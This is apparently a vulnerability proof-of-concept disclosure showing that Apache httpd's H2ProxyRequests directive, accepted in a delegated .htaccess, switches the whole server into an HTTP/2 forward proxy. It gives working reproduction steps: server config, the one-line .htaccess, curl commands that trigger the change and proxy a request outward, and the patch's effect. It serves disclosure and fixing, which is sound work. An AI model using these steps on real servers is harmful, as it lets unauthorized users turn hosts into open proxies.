# PoC 063 - H2ProxyRequests in .htaccess Enables Server-Wide Forward Proxy

`H2ProxyRequests` was registered with `OR_FILEINFO`, so a delegated
`.htaccess` can flip the *server-wide* `proxy_requests` flag of the HTTP/2
config, turning the server into a forward proxy beyond the directory scope
intended for the override.

## Setup

Vulnerable httpd 2.4.66 with `mod_http2`, `mod_ssl`, and `mod_proxy`.

`conf/httpd.conf`:

```
ServerName 127.0.0.1
Listen 127.0.0.1:8443
LoadModule ssl_module       modules/mod_ssl.so
LoadModule http2_module     modules/mod_http2.so
LoadModule proxy_module     modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so

Protocols h2 http/1.1

SSLEngine on
SSLCertificateFile      /tmp/poc063/cert.pem
SSLCertificateKeyFile   /tmp/poc063/key.pem

DocumentRoot /tmp/poc063/docroot
ProxyRequests On                 # forward proxy worker exists; that is fine
                                 # here it is *also* required at server scope
                                 # to observe the impact end-to-end
<Directory /tmp/poc063/docroot>
    AllowOverride FileInfo       # delegated FileInfo override
    Require all granted
</Directory>
```

Generate a throwaway certificate:

```
mkdir -p /tmp/poc063/docroot
openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
    -subj /CN=127.0.0.1 \
    -keyout /tmp/poc063/key.pem -out /tmp/poc063/cert.pem
```

A "delegated user" drops a `.htaccess` in their directory:

```
cat > /tmp/poc063/docroot/.htaccess <<'EOF'
H2ProxyRequests On
EOF
```

## Trigger

```
httpd -X -f $PWD/conf/httpd.conf &

# 1. Cause the delegated .htaccess to be parsed, mutating server-level config.
curl -sk --http2 https://127.0.0.1:8443/ >/dev/null

# 2. From a *different* (non-delegated) URL space, send an HTTP/2 request
#    that targets an absolute URI - the classic forward-proxy form.
curl -v -k --http2-prior-knowledge \
     --resolve example.com:8443:127.0.0.1 \
     -x https://127.0.0.1:8443 \
     https://example.com/probe
```

## Observed effect

Before the `.htaccess` is parsed, mod_http2 ignores the absolute-URI request
because `proxy_requests` is `0`; the second curl returns `403/404` from the
local vhost. After step (1), `h2_config_seti()` falls through to the
`default:` branch and `h2_srv_config_seti()` writes `proxy_requests = 1` on
the server scope. Step (2) is now accepted by `proxy_detect()`, marked
`PROXYREQ_PROXY`, and forwarded to `example.com:443`. `error_log` shows
`mod_proxy: HTTP: serving URL https://example.com/probe`. The escalation is
server-wide and persists for the lifetime of the worker. With the patch
(directive moved to `RSRC_CONF`), `httpd` refuses to start while the
`.htaccess` is in place: `H2ProxyRequests not allowed here`.
